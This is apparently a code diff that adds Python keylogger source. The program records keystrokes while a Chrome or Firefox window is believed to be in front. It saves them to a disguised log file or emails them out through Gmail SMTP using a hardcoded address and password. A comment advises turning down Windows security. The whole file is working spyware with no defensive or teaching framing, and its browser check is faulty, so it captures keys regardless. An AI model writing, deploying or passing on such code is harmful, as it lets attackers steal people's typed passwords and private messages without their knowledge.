@@ -1,0 +1,124 @@
+#Turn down your windows security to test code
+
+
+
+
+
+from pynput.keyboard import Key, Listener
+import win32gui
+import time
+import threading
+import smtplib
+
+
+Email_Addr = 'testc6963@gmail.com'
+Email_password = 'Cs696123'
+class Keylogger:
+
+    def __init__(self,method="email"):
+        self.method = method
+        self.flag = False
+        self.log=""
+
+        self.char_limit = 10
+        print("started")
+
+    def file_output(self):
+       with open("chrome_fire_log.txt","w") as f:
+            print(self.log,file=f)
+       print("chrome_fire_log.txt is saved")
+
+    def on_press(self,key):
+        self.key=str(key)
+
+    def on_release(self,key):
+
+        if self.flag == True:
+            format = str(key).replace("'", "")
+
+            if format == 'Key.space':
+                format = ' '
+            if format == 'Key.shift_r':
+                format = ''
+            if format == 'Key.shift_l':
+                format = ''
+            if format == 'Key.ctrl_l':
+                format = ' ctrl '
+            if format == 'Key.ctrl_r':
+                format = ' rctrl '
+            if format == 'Key.enter':
+                format = '\n'
+            if format == 'Key.alt_l':
+                format = ' lalt '
+            if format == 'Key.alt_r':
+                format = ' ralt '
+            if format == 'Key.backspace':
+                format = ' backs '
+            if format == 'Key.caps_lock':
+                format = ' caps '
+            if format == 'Key.up':
+                format = ' up '
+            if format == 'Key.down':
+                format = ' down '
+            if format == 'Key.left':
+                format = ' left '
+            if format == 'Key.right':
+                format = ' right '
+            if format == 'Key.esc':
+                format = ' esc '
+            if format == 'Key.tab':
+                format = ' tab '
+
+            self.log += format
+            self.check_report()
+        else:
+            return False
+
+
+    def send_email(self,email,password,message):
+        server = smtplib.SMTP('smtp.gmail.com',port=587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email,email,message)
+        self.log=""
+        print(f'email is sent to {email}')
+        server.quit()
+
+    def check_report(self):
+        if len(self.log)>self.char_limit:
+            if self.method == "email":
+                self.send_email(Email_Addr,Email_password,self.log)
+            elif self.method == "file":
+                self.file_output()
+
+    def check(self):
+        while True:
+            windows_processes = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+
+            if 'Firefox' or 'Chrome' in windows_processes:
+                self.flag = True
+            else:
+                self.flag = False
+
+    def checkforeground(self):
+        Thread1 = threading.Thread(target=self.check)
+
+        Thread1.start()
+
+    def start(self):
+        self.check_report()
+        self.checkforeground()
+        with Listener(
+                on_press=self.on_press,
+                on_release=self.on_release) as listener:
+            listener.join()
+
+
+if __name__=="__main__":
+    keylogger = Keylogger(method="file")
+    while True:
+        time.sleep(0.5)
+        windows_processes = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+
+        if 'Firefox' or 'Chrome' in windows_processes:
+            keylogger.start()
